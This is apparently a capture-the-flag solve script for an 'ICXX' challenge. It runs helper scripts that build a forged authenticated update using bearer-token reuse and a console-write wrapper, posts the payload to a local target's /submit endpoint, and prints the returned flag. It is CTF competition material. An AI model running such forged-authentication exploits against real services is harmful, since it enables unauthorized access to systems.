#!/usr/bin/env python3
"""Build and submit the ICXX local exploit.

The target should already be running.  For the reconstructed local binary,
`run_local_solve.sh` starts it with the verifier oracle needed to compensate
for the damaged attachment and then invokes this file.
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
import urllib.error
import urllib.request
from pathlib import Path


HERE = Path(__file__).resolve().parent


def run(*argv: str) -> None:
    subprocess.run([sys.executable, *argv], cwd=HERE, check=True)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("url", nargs="?", default="http://127.0.0.1:1337")
    args = ap.parse_args()
    url = args.url.rstrip("/")

    # Patch the seed-derived GMI with the reply-ring bearer-token reuse and
    # console-write wrapper, then wrap it in the forged authenticated update.
    run("make_token_exploit.py")
    run("make_forged_smuggle.py", url, "token_exploit.gmi")

    body = (HERE / "forged_smuggle.bin").read_bytes()
    req = urllib.request.Request(
        url + "/submit",
        data=body,
        method="POST",
        headers={"Content-Type": "application/octet-stream"},
    )
    try:
        with urllib.request.urlopen(req, timeout=90) as response:
            result = json.load(response)
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", "replace")
        raise SystemExit(f"HTTP {exc.code}: {detail}") from exc

    print(json.dumps(result, indent=2))
    output = result.get("output", "")
    if result.get("state") != "halted" or "{" not in output:
        raise SystemExit("exploit ran, but no flag-like output was returned")
    print(f"[+] flag: {output.strip()}")


if __name__ == "__main__":
    main()
